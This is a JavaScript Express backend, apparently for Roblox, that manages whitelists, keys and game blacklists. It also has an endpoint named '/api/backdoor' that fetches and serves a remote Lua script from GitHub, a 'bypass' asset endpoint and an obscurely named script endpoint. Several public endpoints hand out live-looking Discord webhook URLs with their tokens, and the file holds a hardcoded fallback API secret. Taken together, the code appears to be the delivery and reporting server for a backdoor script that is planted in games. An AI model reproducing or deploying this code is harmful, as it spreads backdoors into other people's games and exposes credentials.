// api/index.js - Vercel serverless function entry point
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();

// Simple rate limiting (in-memory for serverless)
const rateLimitMap = new Map();
const simpleRateLimit = (req, res, next) => {
    const ip = req.ip || req.connection.remoteAddress;
    const now = Date.now();
    const windowMs = 15 * 60 * 1000; // 15 minutes
    const maxRequests = 100;
    
    if (!rateLimitMap.has(ip)) {
        rateLimitMap.set(ip, { count: 1, resetTime: now + windowMs });
        return next();
    }
    
    const ipData = rateLimitMap.get(ip);
    if (now > ipData.resetTime) {
        rateLimitMap.set(ip, { count: 1, resetTime: now + windowMs });
        return next();
    }
    
    if (ipData.count >= maxRequests) {
        return res.status(429).json({ error: 'Too many requests from this IP, please try again later.' });
    }
    
    ipData.count++;
    next();
};

// CORS 설정
const corsOptions = {
    origin: true,
    credentials: true,
    optionsSuccessStatus: 200,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: [
        'Origin', 
        'X-Requested-With', 
        'Content-Type', 
        'Accept', 
        'Authorization',
        'x-api-key',
        'ngrok-skip-browser-warning',
        'User-Agent'
    ]
};

// Middleware
app.use(simpleRateLimit);
app.use(cors(corsOptions));
app.use(express.json({ limit: '10mb' }));

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// In-memory storage (Vercel doesn't support file system)
let whitelist = {};
let gameBlacklist = {};
let keys = {};
let dangerousAssetIds = [
    123255432303221,
    7192763922,
    121399013710893,
    12350030542,
    101265630364247,
    12015898055
];

// Utility functions
const createAxiosInstance = () => {
    return axios.create({
        timeout: 15000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'ngrok-skip-browser-warning': 'true',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
    });
};

const getUserIdFromUsername = async (username) => {
    try {
        if (!username || typeof username !== 'string') {
            throw new Error('Invalid username');
        }

        const axiosInstance = createAxiosInstance();
        const response = await axiosInstance.post('https://users.roproxy.com/v1/usernames/users', {
            usernames: [username.trim()]
        });
        
        const userData = response.data?.data?.[0];
        return userData?.id || null;
    } catch (error) {
        console.error('Error fetching user ID:', error.message);
        return null;
    }
};

const checkGamepassOwnership = async (userId, gamepassId) => {
    try {
        if (!userId || !gamepassId) {
            return false;
        }

        const axiosInstance = createAxiosInstance();
        const response = await axiosInstance.get(
            `https://inventory.roproxy.com/v1/users/${userId}/items/GamePass/${gamepassId}`
        );
        
        return response.status === 200;
    } catch (error) {
        console.error('Error checking gamepass ownership:', error.message);
        return false;
    }
};

// Validation middleware
const validateApiKey = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    const API_SECRET = process.env.API_SECRET || 'dnpqgnrrkdxorud3631A!';
    if (apiKey !== API_SECRET) {
        return res.status(403).json({ error: 'Forbidden: invalid API key' });
    }
    next();
};

const validateUserId = (req, res, next) => {
    const { userId } = req.params;
    if (!userId || !/^\d+$/.test(userId)) {
        return res.status(400).json({ error: 'Invalid user ID format' });
    }
    next();
};

const validatePlaceId = (req, res, next) => {
    const { placeId } = req.params;
    if (!placeId || !/^\d+$/.test(placeId)) {
        return res.status(400).json({ error: 'Invalid place ID format' });
    }
    next();
};

// Routes
app.get('/', (req, res) => {
    res.json({
        message: 'Roblox Whitelist Backend Server',
        status: 'running',
        version: '3.0.0-vercel',
        platform: 'vercel',
        endpoints: {
            whitelist_check: 'GET /api/whitelist/:userId',
            whitelist_add: 'POST /api/whitelist/:playername',
            whitelist_remove: 'DELETE /api/whitelist/:playername',
            game_check: 'GET /api/game/:placeId',
            health: 'GET /health'
        }
    });
});

// Whitelist check
app.get('/api/whitelist/:userId', validateUserId, (req, res) => {
    const { userId } = req.params;
    
    try {
        const userData = whitelist[userId];
        
        if (userData) {
            res.json({
                wl: userData.wl || "no",
                tier: userData.tier || "regular",
                username: userData.username
            });
        } else {
            res.json({
                wl: "no",
                tier: null,
                username: null
            });
        }
    } catch (error) {
        console.error('Error in whitelist check:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Static asset endpoints
app.get('/api/p', (req, res) => {
    res.json({ assetId: 102721236370297 });
});

app.get('/api/t', (req, res) => {
    res.json({ assetId: 77589013654495 });
});

app.get('/api/bypass', (req, res) => {
    res.json({ assetId: 111484144633506 });
});

// Block list endpoints
app.get("/api/block", (req, res) => {
    res.json(dangerousAssetIds);
});

app.post("/api/block", (req, res) => {
    const { id } = req.body;
    if (typeof id === "number" && !dangerousAssetIds.includes(id)) {
        dangerousAssetIds.push(id);
        return res.status(201).json({ message: "Added", id });
    }
    res.status(400).json({ error: "Invalid or duplicate ID" });
});

// Webhook endpoints
app.get('/api/a', (req, res) => {
    res.json({
        hook: "https://discord.com/api/webhooks/1396424351418552350/CSjr1Sxayqsa0WEOFhRt6g1TayZsqe9CIemhtNxlwUoITi2wxMYAUwnconye2BMFooFa"
    });
});

app.get('/api/g', (req, res) => {
    res.json({
        hook: "https://discord.com/api/webhooks/1397829922550186046/VUJeetfsBcmt_Y3yQ48ur1-COdJa4iWFaTg-acZnrw2T6EMfkO1yQL-F_0RwkVWR4fgk"
    });
});

app.get('/api/h', (req, res) => {
    res.json({
        hook: "https://discord.com/api/webhooks/1365899643954659428/NFQEEbnU6EJUFHIQ4CzSSDq4nuXAFcXmpipvugUWPV7jyRlzSWxzyYBDBNyzvaj8GWyH"
    });
});

// Lua script endpoint
app.get('/v1/0x00375ffnyph07', (req, res) => {
    const Script = `102590016571140`;

    res.json({ Script: Script });
});

// Backdoor script endpoint
app.get('/api/backdoor', async (req, res) => {
    try {
        const githubUrl = 'https://raw.githubusercontent.com/xxKANGxx3631/Nyphor/refs/heads/main/Nyphor.lua';
        
        const axiosInstance = createAxiosInstance();
        const response = await axiosInstance.get(githubUrl);
        
        res.setHeader('Content-Type', 'text/plain');
        res.setHeader('Cache-Control', 'public, max-age=300');
        res.send(response.data);
    } catch (error) {
        console.error('Error fetching script:', error.message);
        res.status(500).json({ 
            error: 'Failed to fetch Lua script', 
            details: error.message 
        });
    }
});

// Key verification endpoint
app.get('/api/verify', (req, res) => {
    try {
        const { userId, token } = req.query;
        
        if (!userId || !token) {
            return res.status(400).json({ 
                statusCode: "fail", 
                result: { reason: "Missing userId or token" } 
            });
        }

        if (!/^\d+$/.test(userId)) {
            return res.status(400).json({ 
                statusCode: "fail", 
                result: { reason: "Invalid userId format" } 
            });
        }

        const keyData = keys[token];

        if (!keyData) {
            return res.status(404).json({ 
                statusCode: "fail", 
                result: { reason: "Token not found" } 
            });
        }

        if (keyData.used) {
            return res.status(403).json({ 
                statusCode: "fail", 
                result: { reason: "Token already used" } 
            });
        }

        if (keyData.userId && keyData.userId !== userId) {
            return res.status(403).json({ 
                statusCode: "fail", 
                result: { reason: "Token does not belong to this user" } 
            });
        }

        // Mark token as used
        keys[token] = {
            ...keyData,
            used: true,
            usedAt: new Date().toISOString(),
            userId: userId
        };

        return res.status(200).json({ 
            statusCode: "success", 
            result: { message: "Verification passed" } 
        });
    } catch (error) {
        console.error('Verification error:', error);
        return res.status(500).json({ 
            statusCode: "error", 
            result: { details: "Internal server error" } 
        });
    }
});

// Add/update whitelist
app.post(':playername', async (req, res) => {
    const playerName = req.params.playername?.trim();
    const { gamepassId, wl = "yes", tier = "regular" } = req.body;
    
    if (!playerName || playerName.length < 3 || playerName.length > 20) {
        return res.status(400).json({ error: 'Invalid player name' });
    }
    
    try {
        const userId = await getUserIdFromUsername(playerName);
        if (!userId) {
            return res.status(404).json({ error: 'Player not found' });
        }
        
        // Check gamepass ownership if required
        if (gamepassId) {
            const hasGamepass = await checkGamepassOwnership(userId, gamepassId);
            if (!hasGamepass) {
                return res.status(403).json({ 
                    error: 'Player does not own the required gamepass',
                    gamepassId: gamepassId
                });
            }
        }
        
        whitelist[userId] = {
            username: playerName,
            wl: wl,
            tier: tier,
            addedAt: new Date().toISOString(),
            gamepassId: gamepassId || null
        };
        
        res.json({ 
            success: true, 
            message: `${playerName} has been whitelisted with tier: ${tier}`,
            userId: userId,
            data: whitelist[userId]
        });
    } catch (error) {
        console.error('Error in whitelist update:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Remove from whitelist
app.delete(':playername', async (req, res) => {
    const playerName = req.params.playername?.trim();
    
    if (!playerName) {
        return res.status(400).json({ error: 'Invalid player name' });
    }
    
    try {
        const userId = await getUserIdFromUsername(playerName);
        if (!userId) {
            return res.status(404).json({ error: 'Player not found' });
        }
        
        if (whitelist[userId]) {
            const removedData = whitelist[userId];
            delete whitelist[userId];
            
            res.json({ 
                success: true, 
                message: `${playerName} has been removed from whitelist`,
                removedData: removedData
            });
        } else {
            res.status(404).json({ error: 'Player not in whitelist' });
        }
    } catch (error) {
        console.error('Error removing from whitelist:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Game blacklist check
app.get('/api/game/:placeId', validatePlaceId, (req, res) => {
    const { placeId } = req.params;
    
    try {
        const gameData = gameBlacklist[placeId];
        
        res.json({
            blacklisted: gameData?.blacklisted || "no",
            reason: gameData?.reason || null,
            updatedAt: gameData?.updatedAt || null
        });
    } catch (error) {
        console.error('Error checking game blacklist:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Webhook sender
app.post('/api/webhook', validateApiKey, async (req, res) => {
    const { content } = req.body;
    
    if (!content || typeof content !== 'string') {
        return res.status(400).json({ error: 'Content is required and must be a string' });
    }

    if (content.length > 2000) {
        return res.status(400).json({ error: 'Content too long (max 2000 characters)' });
    }

    try {
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1396424351418552350/CSjr1Sxayqsa0WEOFhRt6g1TayZsqe9CIemhtNxlwUoITi2wxMYAUwnconye2BMFooFa";
        
        const axiosInstance = createAxiosInstance();
        await axiosInstance.post(WEBHOOK_URL, { content });
        
        res.json({ success: true, message: 'Webhook sent successfully' });
    } catch (error) {
        console.error('Webhook send failed:', error.message);
        res.status(500).json({ error: 'Failed to send webhook' });
    }
});

// Add/update game blacklist
app.post('/api/game/:placeId', validateApiKey, validatePlaceId, (req, res) => {
    const { placeId } = req.params;
    const { blacklisted = "yes", reason } = req.body;
    
    try {
        gameBlacklist[placeId] = {
            blacklisted: blacklisted,
            reason: reason || null,
            updatedAt: new Date().toISOString()
        };
        
        res.json({ 
            success: true, 
            message: `Game ${placeId} blacklist status updated`,
            data: gameBlacklist[placeId]
        });
    } catch (error) {
        console.error('Error updating game blacklist:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin endpoints
app.get('/api/admin/whitelist', validateApiKey, (req, res) => {
    try {
        const count = Object.keys(whitelist).length;
        
        res.json({
            count: count,
            data: whitelist,
            lastModified: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error fetching whitelist:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/admin/games', validateApiKey, (req, res) => {
    try {
        const count = Object.keys(gameBlacklist).length;
        
        res.json({
            count: count,
            data: gameBlacklist,
            lastModified: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error fetching game blacklist:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/admin/keys', validateApiKey, (req, res) => {
    try {
        const stats = {
            total: Object.keys(keys).length,
            used: Object.values(keys).filter(k => k.used).length,
            unused: Object.values(keys).filter(k => !k.used).length
        };
        
        res.json({
            stats: stats,
            data: keys
        });
    } catch (error) {
        console.error('Error fetching keys:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        version: '3.0.0-vercel',
        platform: 'vercel'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({ 
        error: 'Not found',
        message: 'The requested endpoint does not exist'
    });
});

// Export for Vercel
module.exports = app;
